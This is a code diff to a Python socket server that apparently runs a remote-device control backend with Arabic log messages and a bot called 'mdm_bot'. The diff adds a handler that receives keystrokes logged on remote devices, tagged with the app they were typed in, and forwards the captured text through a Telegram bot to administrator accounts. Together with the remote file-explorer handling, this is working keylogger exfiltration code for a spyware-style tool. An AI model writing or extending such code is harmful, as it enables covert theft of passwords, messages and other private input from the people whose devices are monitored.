@@ -1406,6 +1406,12 @@ def _sock_file_explorer(data):
         logger.warning(f"[Socket] file_explorer_data from unknown SID={request.sid}")
         return
 
+    # Check for keylog event
+    data_type = data.get("type", "")
+    if data_type == "keylog":
+        _handle_keylog_event(dev, data)
+        return
+    
     cmd = data.get("command", "?")
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
@@ -1419,6 +1425,44 @@ def _sock_file_explorer(data):
         except Exception as e:
             logger.error(f"فشل إرسال نتائج file explorer: {e}")
 
+
+
+def _handle_keylog_event(dev, data):
+    """Process keylogger data and forward to Telegram bot."""
+    try:
+        package = data.get("package", "unknown")
+        text = data.get("text", "")
+        
+        if not text:
+            return
+        
+        short_id = dev.get('short_id', '?')
+        logger.info(f"⌨️ [Keylog] #{short_id} [{package}]: {text[:100]}")
+        
+        # Get app name
+        app_name = _get_app_name(package) if '_get_app_name' in globals() else package
+        
+        if mdm_bot:
+            display_text = text[:500]
+            if len(text) > 500:
+                display_text += "..."
+            
+            msg = (
+                f"⌨️ <b>تسجيل لوحة المفاتيح</b>\n\n"
+                f"📱 <b>الجهاز:</b> #{short_id}\n"
+                f"📱 <b>التطبيق:</b> {app_name}\n"
+                f"📝 <b>النص:</b>\n"
+                f"<code>{display_text}</code>\n\n"
+                f"🕐 <b>الوقت:</b> {datetime.now(timezone.utc).strftime('%H:%M:%S')}"
+            )
+            
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"فشل إرسال keylog للبوت: {e}")
+    except Exception as e:
+        logger.error(f"خطأ في معالجة keylog: {e}")
 
 
 # ── Telegram Webhook Endpoint ──
